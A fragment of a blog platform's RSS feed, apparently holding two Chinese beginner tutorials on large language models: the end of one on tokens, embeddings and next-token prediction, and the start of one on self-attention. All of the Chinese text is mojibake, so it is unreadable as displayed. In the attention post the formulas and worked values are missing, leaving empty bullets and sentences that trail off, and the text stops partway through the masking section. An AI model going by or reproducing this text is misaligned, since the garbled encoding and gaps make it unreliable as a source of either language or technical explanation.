<p>ç»è¿‡å¾ˆå¤š TB çš„æ–‡å­—æ•°æ®è®­ç»ƒä¹‹åï¼Œå°±æˆå°±äº†ç°åœ¨çš„<strong>å¤§è¯­è¨€æ¨¡å‹</strong>ï¼Œå®ƒä¼¼ä¹äº†è§£åœ°çƒä¸Šä¸€åˆ‡æ–‡å­—çŸ¥è¯†ï¼Œå¹¶ä¸”è¡¨è¾¾å‡ºæ¥æ¯«æ— ç»´å’Œæ„Ÿã€‚</p>
<p>ç§‘å­¦ä¼¼ä¹è¿˜æ— æ³•è§£é‡Šè¿™ä»¶äº‹ï¼Œå¤§æ¨¡å‹å¯ä»¥æµç•…å›ç­”è®­ç»ƒæ ·æœ¬é‡Œæ²¡æœ‰çš„å†…å®¹ï¼Œè¿™å°±ç§°ä¸º<strong>æ¶Œç°</strong>ã€‚ä¾‹å¦‚å¤§æ¨¡å‹å…¶å®æ²¡æœ‰ä¸“é—¨å­¦è¿‡ç¿»è¯‘å‘¢ï¼Œä½†æ˜¯å®ƒååå°±å¯ä»¥åœ¨ç¹å¤šçš„å‚æ•°é‡Œé¢æ‡‚å¾—å¦‚ä½•ç¿»è¯‘ä¸åŒè¯­è¨€ã€‚</p>
<h2 data-id="heading-2">è¾“å…¥å’Œè¾“å‡º</h2>
<p>å¯¹äºå¤§æ¨¡å‹æ¥è¯´ï¼Œè¾“å…¥å’Œè¾“å‡ºï¼Œæœ¬è´¨ä¸Šæ˜¯ Tokenã€‚</p>
<p>é€šè¿‡è¿™ä¸ªåˆ†è¯å·¥å…·ï¼Œå¯ä»¥æ›´æ¸…æ™°åœ°ç†è§£ Token çš„æ¦‚å¿µï¼Œå®ƒä¸ä¸€å®šæ˜¯ä¸€ä¸ªå­—æ¯ã€ä¸€ä¸ªå•è¯ã€ä¸€ä¸ªç¬¦å·ï¼Œè€Œæœ‰å¯èƒ½æ˜¯å®ƒä»¬çš„ç»„åˆã€‚</p>
<p>å¦‚å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7babaf0cf86b4b54ac74d3ef2fe09c0d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769248&amp;x-signature=TUpBZgauxSquMhCLAQmvxlZ%2BeSk%3D" alt="" loading="lazy"/></p>
<p>æ‰€ä»¥åœ¨è®­ç»ƒçš„æ—¶å€™ï¼Œè¾“å…¥è¾“å‡ºå°±æ˜¯ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">è¾“å…¥ï¼š30357,</span> <span class="hljs-number">21290</span><span class="hljs-string">,</span> <span class="hljs-number">226</span><span class="hljs-string">,</span> <span class="hljs-number">3221</span>  
<span class="hljs-string">è¾“å‡ºï¼š30357,</span> <span class="hljs-number">21290</span><span class="hljs-string">,</span> <span class="hljs-number">226</span><span class="hljs-string">,</span> <span class="hljs-number">3221</span><span class="hljs-string">,</span> <span class="hljs-number">16491</span>
</code></pre>
<p>å—ï¼Ÿ</p>
<p>ä¸æ˜¯çš„ï¼Œå®é™…è®­ç»ƒçš„è‚¯å®šä¸æ˜¯è¿™ä¸ª Token IDï¼Œè€Œæ˜¯è¿™ä¸ª ID ä»£è¡¨çš„å«ä¹‰æœ¬èº«ã€‚</p>
<p>æŠŠæ–‡å­—è½¬æ¢ä¸ºå‘é‡å°±æ˜¯æ‰€è°“çš„<strong>è¯åµŒå…¥ï¼ˆembeddingï¼‰</strong> ï¼ˆå…³äº RAG åé¢å†å¼€å‘ï¼‰ã€‚æ ¹æ®ã€Šä»é›¶æ„å»ºå¤§æ¨¡å‹ã€‹çš„è¯´æ³•ï¼šæœ€å°çš„ GPT-2 æ¨¡å‹ï¼ˆå‚æ•°é‡ä¸º 1.17 äº¿ï¼‰ä½¿ç”¨çš„åµŒå…¥ç»´åº¦ä¸º 768ï¼Œè€Œ GPT-3æ¨¡å‹ï¼ˆå‚æ•°é‡ä¸º 1750 äº¿ï¼‰ä½¿ç”¨çš„åµŒå…¥ç»´åº¦ä¸º 12288ã€‚</p>
<p>åœ¨è¿™ä¸ªåœºæ™¯ä¸‹ï¼Œç®€å•æ¥è¯´å°±æ˜¯è®©è¿™ä¸ª Token è½¬æ¢ä¸ºä¸€ä¸ª 768 ä¸ªå€¼çš„æ•°ç»„â€¦â€¦</p>
<p>ä¾‹å¦‚ç•ªèŒ„å°±æ˜¯Â <code>[0.9,0.4,0.7,0.5,0.9...åé¢è¿˜æœ‰ä¸ƒç™¾å¤šä¸ªç»´åº¦]</code>ï¼Œå¯¹æ¯”å…¶å®ƒæ°´æœå¯èƒ½æ˜¯è¿™æ ·çš„ï¼š</p>















































<table><thead><tr><th>ç»´åº¦</th><th>å«ä¹‰</th><th>â€œç•ªèŒ„â€çš„å€¼</th><th>â€œè‰è“â€çš„å€¼</th><th>â€œé»„ç“œâ€çš„å€¼</th></tr></thead><tbody><tr><td>1</td><td>æœ‰å¤šçº¢</td><td><strong>0.9</strong></td><td>0.85</td><td>0.1</td></tr><tr><td>2</td><td>ç”œåº¦</td><td>0.4</td><td><strong>0.8</strong></td><td>0.1</td></tr><tr><td>3</td><td>æ°´åˆ†</td><td>0.7</td><td>0.6</td><td><strong>0.9</strong></td></tr><tr><td>4</td><td>æ˜¯å¦å±äºè”¬èœ</td><td><strong>0.5</strong></td><td>0.1</td><td><strong>0.8</strong></td></tr><tr><td>5</td><td>æ˜¯å¦å¯ç”Ÿåƒ</td><td><strong>0.9</strong></td><td><strong>0.95</strong></td><td>0.8</td></tr></tbody></table>
<p>æ³¨æ„ï¼šè¿™é‡Œçš„å«ä¹‰åªæ˜¯æ¯”å–»ï¼Œå®é™…ä¸Šå„ä¸ªç»´åº¦çš„å«ä¹‰äººç±»æ˜¯çœ‹ä¸æ‡‚çš„ã€‚</p>
<p>å¤§å®¶åº”è¯¥å·®ä¸å¤šç†è§£äº†ï¼Œ<strong>çœŸæ­£çš„è¾“å…¥è¾“å‡ºå°±æ˜¯è¿™äº›å‡ ç™¾ä¸Šåƒç»´åº¦</strong>ã€‚</p>
<p>æŠŠè¿™äº›å€¼çš„æ­£ç¡®æ’åˆ—ç»è¿‡ç¥ç»ç½‘ç»œè®­ç»ƒï¼Œè®©å…¶é¢„æµ‹ä¸‹ä¸€ä¸ª Token æ˜¯æŸä¸ªè¯çš„æ¦‚ç‡ï¼ˆlogitsï¼‰ï¼Œç„¶åå–æ¦‚ç‡æ¯”è¾ƒé«˜çš„å€¼ã€‚</p>
<p>æœ€åä¸¾ä¸ªè¾“å…¥è¾“å‡ºä¾‹å­ï¼š</p>
<pre><code class="hljs language-less" lang="less">è¾“å…¥: "ç•ªèŒ„æ˜¯"  
â†“ <span class="hljs-selector-tag">Token</span>åŒ–  
<span class="hljs-selector-tag">Token</span>: <span class="hljs-selector-attr">[123, 456, 789]</span>  
â†“ è½¬æ¢ä¸ºå‘é‡  
<span class="hljs-selector-tag">Vector</span>: <span class="hljs-selector-attr">[[0.1,0.2,...]</span>, <span class="hljs-selector-attr">[0.3,0.4,...]</span>, <span class="hljs-selector-attr">[0.5,0.6,...]</span>]  
â†“ ç¥ç»ç½‘ç»œé¢„æµ‹  
<span class="hljs-selector-tag">Hidden</span> <span class="hljs-selector-tag">State</span>: <span class="hljs-selector-attr">[0.7, -0.2, 1.1, ..., 0.3]</span> Â # <span class="hljs-number">768</span>ç»´éšè—çŠ¶æ€  
â†“ é€šè¿‡è¾“å‡ºå±‚æŠ•å½±  
<span class="hljs-selector-tag">Logits</span>: <span class="hljs-selector-attr">[-2.3, 1.5, ..., 4.2, ..., 2.1, ...]</span> Â # è¯æ±‡è¡¨å¤§å°çš„å‘é‡  
â†“ <span class="hljs-selector-tag">Softmax</span>è½¬æ¢ä¸ºæ¦‚ç‡  
æ¦‚ç‡åˆ†å¸ƒ: <span class="hljs-selector-attr">[0.001, 0.003, ..., 0.45(å¯¹åº”<span class="hljs-string">"çº¢"</span>), ..., 0.25(å¯¹åº”<span class="hljs-string">"åœ†çš„"</span>), ...]</span>  
â†“ é€‰æ‹©æœ€é«˜æ¦‚ç‡  
è¾“å‡º: <span class="hljs-selector-tag">Token</span> <span class="hljs-selector-tag">ID</span> <span class="hljs-number">4567</span> (å¯¹åº”<span class="hljs-string">"çº¢"</span>)
</code></pre>
<p>ä¸­é—´çœ‹ä¸æ‡‚ä¸ç”¨æ€•ï¼Œä¸‹ä¸€ç« å°±ä¼šè®²åˆ°<strong>è‡ªæ³¨æ„åŠ›æœºåˆ¶</strong>çš„åŸç†å•¦~</p>
<h3 data-id="heading-3">å¾ªç¯ç”Ÿæˆ</h3>
<p>ä¸Šé¢ä¸€é¡¿è¾“å…¥è¾“å‡ºå…¶å®åªç”Ÿæˆäº†ä¸€ä¸ªæ–° Tokenï¼Œä½ éœ€è¦ç”Ÿæˆä¸€å¥è¯çš„è¯ï¼Œå°±ç»§ç»­æŠŠæ–°çš„ Token æ‹¼åˆ°åŸæ¥çš„å¥å­é‡Œï¼Œç»§ç»­å¾ªç¯ä¸‹å»ï¼Œå°±èƒ½ç”Ÿæˆä¸€æ•´æ®µè¯å•¦ã€‚</p>
<h2 data-id="heading-4">å‚è€ƒèµ„æ–™</h2>
<ul>
<li>â€¢Â ä»é›¶æ„å»ºå¤§æ¨¡å‹</li>
<li>â€¢Â Deep Dive into LLMs like ChatGPT</li>
</ul>
<h2 data-id="heading-5">å­¦ä¹ èµ„æºæ¨è</h2>
<p>å¦‚æœä½ æƒ³æ›´æ·±å…¥åœ°å­¦ä¹ å¤§æ¨¡å‹ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›éå¸¸æœ‰ä»·å€¼çš„å­¦ä¹ èµ„æºï¼Œè¿™äº›èµ„æºå°†å¸®åŠ©ä½ ä»ä¸åŒè§’åº¦å­¦ä¹ å¤§æ¨¡å‹ï¼Œæå‡ä½ çš„å®è·µèƒ½åŠ›ã€‚</p>
<blockquote>
<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">æ™ºæ³ŠAI</a>ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å°çŒ«éƒ½èƒ½æ‡‚çš„å¤§æ¨¡å‹åŸç† 3 - è‡ªæ³¨æ„åŠ›æœºåˆ¶]]></title>    <link>https://juejin.cn/post/7580674010838777902</link>    <guid>https://juejin.cn/post/7580674010838777902</guid>    <pubDate>2025-12-08T03:27:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580674010838777902" data-draft-id="7580280096059293723" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å°çŒ«éƒ½èƒ½æ‡‚çš„å¤§æ¨¡å‹åŸç† 3 - è‡ªæ³¨æ„åŠ›æœºåˆ¶"/> <meta itemprop="keywords" content="LLM,Agent,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2025-12-08T03:27:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§æ¨¡å‹æ•™ç¨‹"/> <meta itemprop="url" content="https://juejin.cn/user/1145012233707299"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å°çŒ«éƒ½èƒ½æ‡‚çš„å¤§æ¨¡å‹åŸç† 3 - è‡ªæ³¨æ„åŠ›æœºåˆ¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1145012233707299/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§æ¨¡å‹æ•™ç¨‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:27:33.000Z" title="Mon Dec 08 2025 03:27:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">æ™ºæ³ŠAI</a>ã€‚</p>
</blockquote>
<p>Transformer çš„æ ¸å¿ƒåˆ›æ–°å°±æ˜¯è‡ªæ³¨æ„åŠ›æœºåˆ¶ï¼Œå¦‚æœå¿½ç•¥æ•°å­¦å±‚é¢çš„é—®é¢˜ï¼Œå…¶å®ä¸éš¾ç†è§£ã€‚</p>
<p>è¿‡å»çš„æ·±åº¦å­¦ä¹ æ¡†æ¶å¯¹æ–‡å­—çš„å¤„ç†ï¼Œæ²¡æœ‰è€ƒè™‘åˆ°ï¼ˆå¤§èŒƒå›´çš„ï¼‰ä¸Šä¸‹æ–‡ï¼Œä¾‹å¦‚ RNN å°±ä¼šä¸€ç›´å¾ªç¯è®¡ç®—å‰é¢çš„æ–‡å­—çš„å½±å“åŠ›ï¼Œä½†æ˜¯è·ç¦»ä¸€é•¿ï¼Œå‰é¢å†…å®¹çš„è®°å¿†ä¼šä¸¢å¤±å¾—æ¯”è¾ƒå¤šï¼Œè€Œä¸” RNN è¿™ä¸ª<strong>ä¸²è¡Œ</strong>é€»è¾‘ä¹Ÿè·‘ä¸å¿«ã€‚</p>
<h2 data-id="heading-0">è‡ªæ³¨æ„åŠ›</h2>
<p>è‡ªæ³¨æ„åŠ›çš„çªç ´ç‚¹å°±åœ¨è¿™é‡Œï¼Œå®ƒè®©<strong>æ•´ä¸ªä¸Šä¸‹æ–‡é‡Œçš„ Token äº’ç›¸ç†è§£</strong>ï¼Œè®¡ç®—è¿‡ç¨‹æ˜¯å¯ä»¥<strong>å¹¶è¡Œ</strong>è¿›è¡Œçš„ã€‚</p>
<p>ä¹‹å‰è¯´ GPT2 ä¸€ä¸ªè¯ç»´åº¦æœ‰ä¸ƒç™¾å¤šï¼Œåœ¨ä¸‹é¢è¿™ä¸ªä¾‹å­é‡Œé¢ï¼Œæˆ‘ä»¬å‡è®¾ä¸€ä¸ªè¯ç»´åº¦åªæœ‰ 3ã€‚é¦–å…ˆåœ¨è¯å‘é‡çš„åŸºç¡€ä¸ŠåŠ ä¸ŠåŒæ ·ç»´åº¦çš„ä½ç½®å‘é‡ï¼Œç„¶åæˆ‘ä»¬å°±è¦å¼€å§‹å­æ³¨æ„åŠ›é‡Œé¢æœ€ç²¾å½©çš„ QKV è®¡ç®—äº†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d002d329a5764bd1827e7564d0c3f115~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769253&amp;x-signature=6kJLLuGdIjLOA%2B6Toc7nzIOrd88%3D" alt="" loading="lazy"/></p>
<p>æˆ‘ä»¬ä» Token çš„å‘é‡å¼€å§‹ï¼š</p>
<ul>
<li>â€¢ â€œYourâ€ â†’</li>
<li>â€¢ â€œjourneyâ€ â†’</li>
<li>â€¢ â€œstepâ€ â†’</li>
</ul>
<p>ç„¶åï¼Œæ¯ä¸ªÂ Â éƒ½ä¼šé€šè¿‡ä¸‰ä¸ªçŸ©é˜µï¼ˆæ¯ä¸ªæ³¨æ„åŠ›å¤´éƒ½æœ‰è‡ªå·±çš„ä¸‰ä¸ªçŸ©é˜µï¼Œè¿™ä¸‰ä¸ªçŸ©é˜µæ˜¯<strong>å¯è®­ç»ƒçš„</strong>ï¼‰ï¼š</p>
<p>åˆ†åˆ«<strong>ç‚¹ç§¯</strong>å¾—åˆ°ï¼š</p>
<ul>
<li>â€¢ Query å‘é‡</li>
<li>â€¢ Key å‘é‡</li>
<li>â€¢ Value å‘é‡</li>
</ul>
<h2 data-id="heading-1">Query å…¶ä»– Token</h2>
<p>ä»¥å½“å‰è¯ â€œjourneyâ€ ä¸ºä¾‹ï¼Œå°±æ˜¯ç”¨å®ƒçš„Â <strong>query å‘é‡</strong>ï¼Œå»ç‚¹ä¹˜<strong>æ•´ä¸ªä¸Šä¸‹æ–‡å…¶ä»–è¯</strong>çš„Â <strong>key å‘é‡</strong>ï¼š</p>
<ul>
<li>â€¢ â€œYourâ€ â†’</li>
<li>â€¢ â€œjourneyâ€ â†’</li>
<li>â€¢ â€œstepâ€ â†’</li>
</ul>
<p>è¿™å°±ç­‰äºè®¡ç®—æ¯ä¸ªè¯ä¸å½“å‰ query çš„<strong>ç›¸ä¼¼åº¦</strong>ï¼š</p>
<p>ä¾‹å¦‚ï¼š</p>
<ul>
<li>â€¢</li>
<li>â€¢</li>
<li>â€¢ ...</li>
<li>â€¢</li>
</ul>
<p>è¿™äº›ç»“æœä»£è¡¨äº†å½“å‰è¯ï¼ˆâ€œjourneyâ€ï¼‰ä¸å…¶ä»–è¯çš„â€œç›¸å…³ç¨‹åº¦â€ã€‚</p>
<blockquote>
<p>ç‚¹ç§¯ï¼š ç‚¹ç§¯ä¸ä»…è¢«è§†ä¸ºä¸€ç§å°†ä¸¤ä¸ªå‘é‡è½¬åŒ–ä¸ºæ ‡é‡å€¼çš„æ•°å­¦å·¥å…·ï¼Œè€Œä¸”ä¹Ÿæ˜¯åº¦é‡ç›¸ä¼¼åº¦çš„ä¸€ç§æ–¹ å¼ï¼Œå› ä¸ºå®ƒå¯ä»¥é‡åŒ–ä¸¤ä¸ªå‘é‡ä¹‹é—´çš„å¯¹é½ç¨‹åº¦ï¼šç‚¹ç§¯è¶Šå¤§ï¼Œå‘é‡ä¹‹é—´çš„å¯¹é½ç¨‹åº¦æˆ–ç›¸ä¼¼åº¦å°± è¶Šé«˜ã€‚åœ¨è‡ªæ³¨æ„æœºåˆ¶ä¸­ï¼Œç‚¹ç§¯å†³å®šäº†åºåˆ—ä¸­æ¯ä¸ªå…ƒç´ å¯¹å…¶ä»–å…ƒç´ çš„å…³æ³¨ç¨‹åº¦ï¼šç‚¹ç§¯è¶Šå¤§ï¼Œä¸¤ ä¸ªå…ƒç´ ä¹‹é—´çš„ç›¸ä¼¼åº¦å’Œæ³¨æ„åŠ›åˆ†æ•°å°±è¶Šé«˜ã€‚</p>
</blockquote>
<h2 data-id="heading-2">å½’ä¸€åŒ–æ³¨æ„åŠ›æƒé‡</h2>
<p>æ¥ç€å¯¹æ‰€æœ‰ç›¸ä¼¼åº¦Â Â è¿›è¡Œ Softmax å½’ä¸€åŒ–ï¼ˆå…¬å¼ä¸ç”¨ç»†çœ‹ï¼Œå½’ä¸€åŒ–å°±æ˜¯è®©æ‰€æœ‰å€¼åŠ èµ·æ¥ç­‰äº 1ï¼‰ï¼š</p>
<p>å¾—åˆ°ï¼š</p>
<ul>
<li>â€¢</li>
<li>â€¢</li>
<li>â€¢ ...</li>
<li>â€¢</li>
</ul>
<p>è¿™äº›å€¼ç§°ä¸ºÂ <strong>æ³¨æ„åŠ›æƒé‡ï¼ˆattention weightsï¼‰</strong> ï¼Œè¡¨ç¤ºæ¨¡å‹åœ¨å¤„ç†å½“å‰è¯â€œjourneyâ€æ—¶ï¼Œå¯¹å…¶ä»–è¯çš„å…³æ³¨ç¨‹åº¦ã€‚</p>
<h2 data-id="heading-3">ä¸Šä¸‹æ–‡å‘é‡</h2>
<p>æœ€åä¸€æ­¥ï¼š æ¯ä¸ªè¯éƒ½æœ‰è‡ªå·±çš„ value å‘é‡Â ï¼Œå°†å®ƒä¸å¯¹åº”çš„æ³¨æ„åŠ›æƒé‡ç›¸ä¹˜å¹¶æ±‚å’Œï¼š</p>
<p>å¦‚å›¾ä¸­ï¼š</p>
<ul>
<li>â€¢</li>
<li>â€¢</li>
<li>â€¢ ...</li>
<li>â€¢</li>
</ul>
<p>è®¡ç®—åå¾—åˆ°ï¼š</p>
<p>è¿™ä¸ªå‘é‡Â Â å°±æ˜¯Â  <strong>â€œjourneyâ€ çš„ä¸Šä¸‹æ–‡å‘é‡ï¼ˆcontext vectorï¼‰</strong> ï¼Œ<strong>å®ƒç»¼åˆäº†å¥å­ä¸­å„ä¸ªè¯çš„è¯­ä¹‰ä¿¡æ¯</strong>ï¼Œå¹¶ä¸”æ ¹æ®æ³¨æ„åŠ›æƒé‡åŠ¨æ€å†³å®šäº†â€œå…³æ³¨è°â€ã€‚</p>
<p>åœ¨ç‚¹ç§¯ä¹‹åï¼Œä¸ºäº†é˜²æ­¢æ•°å€¼è¿‡å¤§å¯¼è‡´ Softmax ç®—å‡ºæ¥çš„æ¢¯åº¦å¤ªå°ï¼ˆéš¾ä»¥è®­ç»ƒï¼‰ï¼Œæˆ‘ä»¬é€šå¸¸ä¼šæŠŠç»“æœé™¤ä»¥ä¸€ä¸ªç¼©æ”¾ç³»æ•°ï¼ˆé€šå¸¸æ˜¯ç»´åº¦çš„æ ¹å·ï¼Œå³Â ï¼‰ï¼Œç„¶åå†åšå½’ä¸€åŒ–ã€‚</p>
<p>ç»è¿‡ä¸Šé¢ä¸€åŒæ“ä½œï¼Œå°±å¾—å‡ºäº†è‘—åå¾—æ³¨æ„åŠ›å…¬å¼ï¼š</p>
<h2 data-id="heading-4">æ©ç </h2>
<p><strong>å› æœæ³¨æ„åŠ›</strong>å°±æ˜¯æŠŠæ¯ä¸ªå­—åé¢çš„å­—éƒ½ç›–ä½ï¼Œé˜²å·çœ‹ã€‚</p>
